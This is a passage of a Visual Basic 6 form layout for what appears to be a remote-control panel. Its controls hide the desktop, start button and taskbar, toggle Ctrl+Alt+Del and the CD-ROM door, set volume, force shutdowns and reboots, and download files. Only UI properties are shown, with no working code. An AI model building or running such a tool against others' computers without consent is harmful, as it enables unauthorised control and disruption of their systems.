            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   3
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   167
         ToolTipText     =   "Show start button"
         Top             =   750
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Hide"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   0
         Left            =   1470
         Style           =   1  'Graphical
         TabIndex        =   166
         ToolTipText     =   "Hide desktop icon"
         Top             =   390
         Width           =   1200
      End
      Begin VB.CommandButton cmdExtra_29 
         Caption         =   "Show"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   2730
         Style           =   1  'Graphical
         TabIndex        =   165
         ToolTipText     =   "Show desktop icon"
         Top             =   390
         Width           =   1200
      End
      Begin VB.Label Label54 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "NumLock:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   195
         Top             =   3690
         Width           =   1185
      End
      Begin VB.Label Label53 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "CapsLock:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   194
         Top             =   3330
         Width           =   1185
      End
      Begin VB.Label Label52 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "ScrollLock:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   193
         Top             =   2970
         Width           =   1185
      End
      Begin VB.Label Label51 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Ctrl+Alt+Del:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   192
         Top             =   2610
         Width           =   1185
      End
      Begin VB.Label Label50 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Monitor:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   191
         Top             =   2250
         Width           =   1185
      End
      Begin VB.Label Label49 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Speaker:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   190
         Top             =   1890
         Width           =   1185
      End
      Begin VB.Label Label48 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "CD-ROM Door:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   189
         Top             =   1530
         Width           =   1185
      End
      Begin VB.Label Label47 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Taskbar:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   188
         Top             =   1140
         Width           =   1185
      End
      Begin VB.Label Label46 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Start Button:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   187
         Top             =   780
         Width           =   1185
      End
      Begin VB.Label Label45 
         Alignment       =   1  'Right Justify
         BackStyle       =   0  'Transparent
         Caption         =   "Desktop:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   186
         Top             =   420
         Width           =   1185
      End
      Begin VB.Label Label44 
         BackStyle       =   0  'Transparent
         Caption         =   "Extra                                                                                "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   175
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   30
      Left            =   5340
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   58
      Top             =   2790
      Width           =   4065
      Begin VB.Label lblMain 
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   3225
         Left            =   930
         TabIndex        =   59
         Top             =   390
         Width           =   2775
      End
      Begin VB.Image Image1 
         Height          =   480
         Left            =   270
         Picture         =   "frmMain.frx":27DA
         Top             =   420
         Width           =   480
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   5
      Left            =   2400
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   10
      Top             =   1290
      Width           =   4065
   End
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   210
      Top             =   6510
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   9
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":379C
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":38F8
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":3A54
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":3BB4
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":3D14
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":40B0
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":444C
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":45A8
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmMain.frx":4704
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin VB.CommandButton cmdAddrBook 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   5070
      Picture         =   "frmMain.frx":4860
      Style           =   1  'Graphical
      TabIndex        =   354
      ToolTipText     =   "IP Tool"
      Top             =   90
      Width           =   330
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   10
      Left            =   3000
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   15
      Top             =   1590
      Width           =   4065
      Begin VB.CheckBox CheckTXT 
         BackColor       =   &H80000010&
         Caption         =   "When downloading text files, run notepad"
         Height          =   225
         Left            =   180
         TabIndex        =   352
         Top             =   3120
         Width           =   3345
      End
      Begin VB.CommandButton cmdFolder_10 
         Caption         =   "Click here to change local folder"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Left            =   360
         Style           =   1  'Graphical
         TabIndex        =   295
         ToolTipText     =   "Click here to change local folder"
         Top             =   1320
         Width           =   3333
      End
      Begin VB.TextBox txtLocalFolder_10 
         Height          =   285
         Left            =   180
         Locked          =   -1  'True
         TabIndex        =   293
         ToolTipText     =   "Local folder for downloaded files"
         Top             =   810
         Width           =   3640
      End
      Begin VB.Label Label76 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Download Files:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   180
         TabIndex        =   353
         Top             =   2820
         Width           =   1125
      End
      Begin VB.Label Label77 
         BackStyle       =   0  'Transparent
         Caption         =   $"frmMain.frx":49AA
         ForeColor       =   &H80000008&
         Height          =   825
         Left            =   180
         TabIndex        =   294
         Top             =   1830
         Width           =   3690
      End
      Begin VB.Label Label76 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Local Folder:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   210
         TabIndex        =   292
         Top             =   540
         Width           =   915
      End
      Begin VB.Label Label25 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Local Option                                                              "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   120
         TabIndex        =   111
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.Timer TimerTransfer 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   3660
      Top             =   6630
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   27
      Left            =   5040
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   55
      Top             =   2610
      Width           =   4065
      Begin ComctlLib.Slider VolumeSlider_27 
         Height          =   375
         Index           =   0
         Left            =   750
         TabIndex        =   319
         Top             =   1020
         Width           =   2400
         _ExtentX        =   4233
         _ExtentY        =   661
         _Version        =   327682
         Max             =   65535
         TickStyle       =   3
      End
      Begin VB.CheckBox CheckMute_27 
         BackColor       =   &H80000010&
         Caption         =   "Mute"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   750
         TabIndex        =   211
         Top             =   2700
         Width           =   765
      End
      Begin VB.CommandButton cmdSound_27 
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   2
         Left            =   3300
         Style           =   1  'Graphical
         TabIndex        =   210
         ToolTipText     =   "Set CD volume"
         Top             =   2160
         Width           =   600
      End
      Begin VB.CommandButton cmdSound_27 
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   3300
         Style           =   1  'Graphical
         TabIndex        =   209
         ToolTipText     =   "Set wave volume"
         Top             =   1590
         Width           =   600
      End
      Begin VB.CommandButton cmdSound_27 
         Caption         =   "Set"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   0
         Left            =   3300
         Style           =   1  'Graphical
         TabIndex        =   208
         ToolTipText     =   "Set master volume"
         Top             =   1050
         Width           =   600
      End
      Begin VB.CommandButton cmdSound_27 
         Caption         =   "Read Current Volume Settings"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   3
         Left            =   540
         Style           =   1  'Graphical
         TabIndex        =   207
         ToolTipText     =   "Read current volume settings"
         Top             =   3270
         Width           =   3000
      End
      Begin ComctlLib.Slider VolumeSlider_27 
         Height          =   375
         Index           =   1
         Left            =   750
         TabIndex        =   320
         Top             =   1560
         Width           =   2400
         _ExtentX        =   4233
         _ExtentY        =   661
         _Version        =   327682
         Max             =   65535
         TickStyle       =   3
      End
      Begin ComctlLib.Slider VolumeSlider_27 
         Height          =   375
         Index           =   2
         Left            =   750
         TabIndex        =   321
         Top             =   2130
         Width           =   2400
         _ExtentX        =   4233
         _ExtentY        =   661
         _Version        =   327682
         Max             =   65535
         TickStyle       =   3
      End
      Begin VB.Label Label60 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "View/Change Volume Settings:"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   180
         TabIndex        =   206
         Top             =   600
         Width           =   2580
      End
      Begin VB.Label Label59 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "CD"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   390
         TabIndex        =   205
         Top             =   2190
         Width           =   225
      End
      Begin VB.Label Label58 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Wave"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   150
         TabIndex        =   204
         Top             =   1590
         Width           =   480
      End
      Begin VB.Label Label57 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Master"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   195
         Left            =   60
         TabIndex        =   203
         Top             =   1050
         Width           =   600
      End
      Begin VB.Label Label56 
         BackStyle       =   0  'Transparent
         Caption         =   "Sound                                                                           "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   202
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   25
      Left            =   4800
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   30
      Top             =   2490
      Width           =   4065
      Begin VB.CommandButton cmdRestartWin_25 
         Caption         =   "Normal Shut Down"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   500
         Index           =   0
         Left            =   780
         Style           =   1  'Graphical
         TabIndex        =   201
         ToolTipText     =   "Normal shut down"
         Top             =   570
         Width           =   2500
      End
      Begin VB.CommandButton cmdRestartWin_25 
         Caption         =   "Force Windows Shut Down"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   500
         Index           =   1
         Left            =   780
         Style           =   1  'Graphical
         TabIndex        =   200
         ToolTipText     =   "Force windows shut down"
         Top             =   1230
         Width           =   2500
      End
      Begin VB.CommandButton cmdRestartWin_25 
         Caption         =   "Log Off Windows User"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   500
         Index           =   2
         Left            =   780
         Style           =   1  'Graphical
         TabIndex        =   199
         ToolTipText     =   "Log off windows user"
         Top             =   1890
         Width           =   2500
      End
      Begin VB.CommandButton cmdRestartWin_25 
         Caption         =   "Reboot System"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   500
         Index           =   3
         Left            =   780
         Style           =   1  'Graphical
         TabIndex        =   198
         ToolTipText     =   "Reboot system"
         Top             =   2550
         Width           =   2500
      End
      Begin VB.CommandButton cmdRestartWin_25 
         Caption         =   "Force Reboot System"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   500
         Index           =   4
         Left            =   780
         Style           =   1  'Graphical
         TabIndex        =   197
         ToolTipText     =   "Force reboot system"
         Top             =   3210
         Width           =   2500
      End
      Begin VB.Label Label55 
         BackStyle       =   0  'Transparent
         Caption         =   "Restart Win                                                                      "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   196
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   24
      Left            =   4680
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   29
      Top             =   2430
      Width           =   4065
      Begin ComctlLib.Slider ResolutionSlider 
         Height          =   375
         Left            =   2160
         TabIndex        =   322
         Top             =   1800
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         _Version        =   327682
         Max             =   100
         SelStart        =   50
         TickStyle       =   3
         Value           =   50
      End
      Begin VB.ComboBox cbFStyle_24 
         Height          =   315
         ItemData        =   "frmMain.frx":4A4C
         Left            =   180
         List            =   "frmMain.frx":4A5C
         Style           =   2  'Dropdown List
         TabIndex        =   268
         Top             =   1800
         Width           =   1700
      End
      Begin VB.VScrollBar SizeVScroll_24 
         Height          =   315
         Left            =   3540
         Max             =   0
         Min             =   100
         TabIndex        =   266
         Top             =   960
         Value           =   50
         Width           =   315
      End
      Begin VB.TextBox txtSize_24 
         Height          =   315
         Left            =   3030
         Locked          =   -1  'True
         MaxLength       =   3
         TabIndex        =   265
         Text            =   "50"
         Top             =   960
         Width           =   420
      End
      Begin VB.ComboBox cbFont_24 
         Height          =   315
         ItemData        =   "frmMain.frx":4A84
         Left            =   600
         List            =   "frmMain.frx":4AD0
         Style           =   2  'Dropdown List
         TabIndex        =   264
         Top             =   960
         Width           =   1905
      End
      Begin VB.ComboBox cbSStyle_24 
         Height          =   315
         ItemData        =   "frmMain.frx":4C0B
         Left            =   180
         List            =   "frmMain.frx":4C1B
         Style           =   2  'Dropdown List
         TabIndex        =   263
         Top             =   2730
         Width           =   1700
      End
      Begin VB.CommandButton cmdScrSaver_24 
         Caption         =   "Run Screen Saver"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   1
         Left            =   2160
         Style           =   1  'Graphical
         TabIndex        =   262
         ToolTipText     =   "Run screen saver"
         Top             =   3420
         Width           =   1700
      End
      Begin VB.CommandButton cmdScrSaver_24 
         Caption         =   "Save Settings"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   400
         Index           =   0
         Left            =   180
         Style           =   1  'Graphical
         TabIndex        =   261
         ToolTipText     =   "Save screen saver settings"
         Top             =   3420
         Width           =   1700
      End
      Begin VB.TextBox txtText_24 
         Height          =   285
         Left            =   600
         MaxLength       =   16
         TabIndex        =   260
         Text            =   "Hello World!"
         Top             =   480
         Width           =   3255
      End
      Begin ComctlLib.Slider SpeedSlider 
         Height          =   375
         Left            =   2160
         TabIndex        =   323
         Top             =   2730
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         _Version        =   327682
         Max             =   100
         SelStart        =   50
         TickStyle       =   3
         Value           =   50
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Font Style:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   6
         Left            =   180
         TabIndex        =   269
         Top             =   1500
         Width           =   795
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Resolution:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   5
         Left            =   2070
         TabIndex        =   267
         Top             =   1500
         Width           =   810
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Speed:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   4
         Left            =   2070
         TabIndex        =   259
         Top             =   2430
         Width           =   510
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Spin Style:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   3
         Left            =   180
         TabIndex        =   258
         Top             =   2430
         Width           =   765
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Size:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   2
         Left            =   2640
         TabIndex        =   257
         Top             =   990
         Width           =   345
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Font:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   180
         TabIndex        =   256
         Top             =   1020
         Width           =   390
      End
      Begin VB.Label Label74 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Text:"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   180
         TabIndex        =   255
         Top             =   510
         Width           =   390
      End
      Begin VB.Label Label73 
         BackStyle       =   0  'Transparent
         Caption         =   "Screen Saver                                                                "
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   -1  'True
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000008&
         Height          =   225
         Left            =   120
         TabIndex        =   254
         Top             =   90
         Width           =   3800
      End
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   23
      Left            =   4560
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   28
      Top             =   2370
      Width           =   4065
   End
   Begin VB.PictureBox picfunc 
      Appearance      =   0  'Flat
      BackColor       =   &H80000010&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   4065
      Index           =   22
      Left            =   4440
      ScaleHeight     =   4035
      ScaleWidth      =   4035
      TabIndex        =   27
      Top             =   2310
      Width           =   4065
      Begin VB.CommandButton cmdWinColor_22 
         Caption         =   "Restore Default Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   2
         Left            =   450
         Style           =   1  'Graphical
         TabIndex        =   335
         ToolTipText     =   "Restore default colors on local"
         Top             =   3510
         Width           =   3120
      End
      Begin VB.CommandButton cmdWinColor_22 
         Caption         =   "Change Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   1
         Left            =   2070
         Style           =   1  'Graphical
         TabIndex        =   233
         ToolTipText     =   "Change colors"
         Top             =   3090
         Width           =   1500
      End
      Begin VB.CommandButton cmdWinColor_22 
         Caption         =   "Test Colors"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         Index           =   0
         Left            =   450
         Style           =   1  'Graphical
         TabIndex        =   232
         ToolTipText     =   "Test Colors on local"
         Top             =   3090
         Width           =   1500
      End
      Begin VB.Label lbShape_22 
         BackStyle       =   0  'Transparent
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   360
         Index           =   3
         Left            =   360
         TabIndex        =   237
         Top             =   2460
         Width           =   360
      End
      Begin VB.Label Label69 
         AutoSize        =   -1  'True
